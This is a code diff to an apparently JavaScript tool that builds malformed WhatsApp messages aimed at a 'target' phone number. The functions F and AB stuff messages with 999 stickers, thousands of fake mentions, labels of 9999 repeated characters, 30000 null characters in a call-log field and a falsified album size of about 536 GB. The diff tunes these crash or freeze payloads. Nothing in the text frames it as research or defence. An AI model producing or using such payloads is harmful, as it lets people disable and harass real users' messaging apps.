@@ -421,7 +421,7 @@ async function F(sock, target) {
             stickers: Array.from({ length: 999 }, () => ({
                 fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                 isAnimated: false,
-                emojis: ["🩸", "🩸"],
+                emojis: ["🩸"],
                 accessibilityLabel: "ꦽ".repeat(9999),
                 stickerSentTs: " ",
                 isAvatar: true,
@@ -445,18 +445,33 @@ async function F(sock, target) {
                 },
                 mentionedJid: [
                     target, "13135550002@s.whatsapp.net",
-                    ...Array.from({ length: 30000 }, () =>
-                        `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`
+                    ...Array.from({ length: 3000 }, () =>
+                        `1${Math.floor(Math.random() * 49990)}@s.whatsapp.net`
                     )
                 ],
                 quotedMessage: {
                     callLogMesssage: {
                         isVideo: true,
                         callOutcome: 0,
-                        durationSecs: "999",
+                        durationSecs: '\u0000'.repeat(30000),
                         callType: "VIDEO",
                         participants: [
                             { jid: target, callOutcome: 1 },
+                            { jid: target, callOutcome: 0 },
+                            { jid: target, callOutcome: 1 },
+                            { jid: target, callOutcome: 0 },
+                            { jid: target, callOutcome: 1 },
+                            { jid: target, callOutcome: 0 },
+                            { jid: target, callOutcome: 1 },
+                            { jid: target, callOutcome: 0 },
+                            { jid: target, callOutcome: 1 },
+                            { jid: target, callOutcome: 0 },
+                            { jid: target, callOutcome: 1 },
+                            { jid: target, callOutcome: 0 },
+                            { jid: target, callOutcome: 1 },
+                            { jid: target, callOutcome: 0 },
+                            { jid: target, callOutcome: 1 },
+                            { jid: target, callOutcome: 0 },
                         ]
                     }
                 },
@@ -485,7 +500,7 @@ async function F(sock, target) {
 async function AB(sock, target, mention) {
     const phynxImage = "https://files.catbox.moe/t64p42.jpg";
     const Amount = 9999;
-    const sizeAlbum = "5368709";
+    const sizeAlbum = "536870912000";
     const mentionedSize = 31111;
     const mentionedCustom = [
         "phynxagency@s.whatsapp.net",
